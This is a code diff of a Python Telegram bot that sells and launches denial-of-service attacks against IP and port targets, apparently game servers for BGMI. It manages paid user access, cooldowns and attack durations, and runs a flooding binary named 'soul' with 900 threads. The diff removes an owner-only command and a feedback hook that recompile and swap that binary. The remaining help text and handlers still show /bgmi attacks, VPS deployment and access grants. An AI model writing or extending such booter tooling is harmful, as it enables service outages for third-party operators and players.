@@ -322,12 +322,7 @@ def handle_feedback(call):
     global feedback_count
     if feedback == "not":
         feedback_count[expected_user_id] = feedback_count.get(expected_user_id, 0) + 1
-        if feedback_count[expected_user_id] >= 7:
-            upload_new_binary()
-            feedback_count[expected_user_id] = 0
-            result_text = "Repeated negative feedback detected. New binary compiled and uploaded."
-        else:
-            result_text = f"Negative feedback recorded ({feedback_count[expected_user_id]}/7)."
+        result_text = f"Negative feedback recorded ({feedback_count[expected_user_id]}/7)."
     else:
         feedback_count[expected_user_id] = 0
         result_text = "Great! Feedback noted."
@@ -341,35 +336,6 @@ def handle_feedback(call):
     except Exception as e:
         logging.error("Error editing feedback message: " + str(e))
     bot.answer_callback_query(call.id, result_text)
-
-def get_next_binary_name():
-    files = os.listdir('.')
-    binary_numbers = []
-    for f in files:
-        if f.isdigit():
-            try:
-                binary_numbers.append(int(f))
-            except ValueError:
-                continue
-    if binary_numbers:
-        next_num = max(binary_numbers) + 1
-    else:
-        next_num = 1
-    return str(next_num)
-
-def upload_new_binary():
-    try:
-        compile_command = "gcc tester.c -o temp_binary"
-        subprocess.check_call(compile_command, shell=True)
-        next_binary = get_next_binary_name()
-        os.rename("temp_binary", next_binary)
-        os.chmod(next_binary, 0o755)
-        if os.path.islink("soul") or os.path.exists("soul"):
-            os.remove("soul")
-        os.symlink(next_binary, "soul")
-        logging.info(f"New binary {next_binary} compiled and uploaded successfully.")
-    except Exception as e:
-        logging.error(f"Error compiling new binary: {e}")
 
 @bot.message_handler(commands=['deploy'])
 def deploy_command(message):
@@ -486,78 +452,6 @@ def handle_bgmi(message):
     )
     ask_attack_feedback(caller_id, message.chat.id)
 
-@bot.message_handler(commands=['update_binary'])
-def update_binary_command(message):
-    if not is_authorized(message):
-        bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
-        return
-    caller_id = str(message.from_user.id)
-    if caller_id != OWNER_ID:
-        bot.reply_to(message, "❌ Only the owner can use the /update_binary command.")
-        return
-    command = message.text.split()
-    if len(command) not in [4, 5]:
-        bot.reply_to(message, "Invalid format! Use: `/update_binary <target> <port> <duration> [threads]`", parse_mode='Markdown')
-        return
-    target = command[1]
-    port = command[2]
-    if not port.isdigit() or not (1 <= int(port) <= 65535):
-        bot.reply_to(message, "❌ Invalid port! Please provide a port number between 1 and 65535.")
-        return
-    if not is_valid_ip(target):
-        bot.reply_to(message, "❌ Invalid target IP! Please provide a valid IP address.")
-        return
-    try:
-        duration = int(command[3])
-    except ValueError:
-        bot.reply_to(message, "❌ Invalid duration! Please provide a valid number.")
-        return
-    threads = "900"
-    if len(command) == 5:
-        threads = command[4]
-        if not threads.isdigit():
-            bot.reply_to(message, "❌ Invalid threads count! Please provide a valid number.")
-            return
-    current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
-    if len(current_active) >= 1:
-        bot.reply_to(message, "🚨 Maximum of 1 concurrent attack allowed. Please wait for the current attack to finish before launching a new one.")
-        return
-    upload_new_binary()
-    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
-    attack_info = {'user_id': caller_id, 'target': target, 'port': port, 'end_time': attack_end_time}
-    try:
-        proc = subprocess.Popen(["./soul", target, port, str(duration), threads],
-                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        attack_info["proc"] = proc
-    except Exception as e:
-        logging.error(f"Subprocess error: {e}")
-        bot.reply_to(message, "🚨 An error occurred while executing the updated binary command.")
-        return
-    with attacks_lock:
-        active_attacks.append(attack_info)
-    save_active_attacks()
-    log_attack(caller_id, target, port, duration)
-    msg = bot.send_message(
-        message.chat.id,
-        f"""
-⚡️🔥 UPDATED BINARY ATTACK DEPLOYED 🔥⚡️
-
-👑 Commander: `{caller_id}`
-🎯 Target Locked: `{target}`
-📡 Port Engaged: `{port}`
-⏳ Time Remaining: `{duration} seconds`
-⚔️ Weapon: `BGMI Protocol (Updated Binary)`
-🔥 The new binary is now live and attacking! 🔥
-        """,
-        parse_mode='Markdown'
-    )
-    attack_info['message_id'] = msg.message_id
-    save_active_attacks()
-    asyncio.run_coroutine_threadsafe(
-        async_update_countdown(message, msg.message_id, datetime.datetime.now(), duration, caller_id, target, port, attack_info),
-        async_loop
-    )
-
 @bot.message_handler(commands=['when'])
 def when_command(message):
     global active_attacks
@@ -581,22 +475,21 @@ def help_command(message):
 🚀 Available Commands:
 - /start - Get started with a welcome message!
 - /help - Discover all the available commands.
-- /bgmi &lt;target&gt; &lt;port&gt; &lt;duration&gt; - Launch an attack.
-- /update_binary &lt;target&gt; &lt;port&gt; &lt;duration&gt; [threads] - Recompile and launch a new binary instantly. (Owner only)
+- /bgmi <target> <port> <duration> - Launch an attack.
 - /deploy - Deploy Clodways repo to all VPS (Owner only)
 - /stop_all - Stop all running attacks. (Owner only)
 - /when - Check the remaining time for current attacks.
-- /grant &lt;user_id&gt; &lt;duration&gt; - Grant access.
-- /revoke &lt;user_id&gt; - Revoke access.
-- /attack_limit &lt;user_id&gt; &lt;max_duration&gt; - Set max attack duration (Owner only).
+- /grant <user_id> <duration> - Grant access.
+- /revoke <user_id> - Revoke access.
+- /attack_limit <user_id> <max_duration> - Set max attack duration (Owner only).
 - /status - Check your subscription status.
 - /list_users - List all users with access (Owner only).
 - /backup - Backup user access data (Owner only).
 - /download_backup - Download user data (Owner only).
-- /set_cooldown &lt;user_id&gt; &lt;minutes&gt; - Set a user's cooldown time (Owner only).
+- /set_cooldown <user_id> <minutes> - Set a user's cooldown time (Owner only).
 
 Usage Notes:
-- Replace &lt;user_id&gt;, &lt;target&gt;, &lt;port&gt;, &lt;duration&gt;, and [threads] with appropriate values.
+- Threads fixed at 900.
 - For assistance, contact the owner.
     """
     try:
